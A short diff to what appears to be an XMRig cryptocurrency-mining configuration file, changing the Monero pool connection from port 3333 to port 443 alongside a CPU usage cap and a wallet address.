@@ -19,7 +19,7 @@
     "max-cpu-usage": 75,
     "pools": [
         {
-            "url": "pool.supportxmr.com:3333",
+            "url": "pool.supportxmr.com:443",
             "user": "49SMtuhUDYM7KyrFw5DxayTth8rLkNjn81LoYMLcDsesB6SJWAmeg6LRRuMimuj9ryVH3qVkuweHV7oKdHwJYbgdFSV7RCF",
             "pass": "xmrig",
             "rig-id": null,
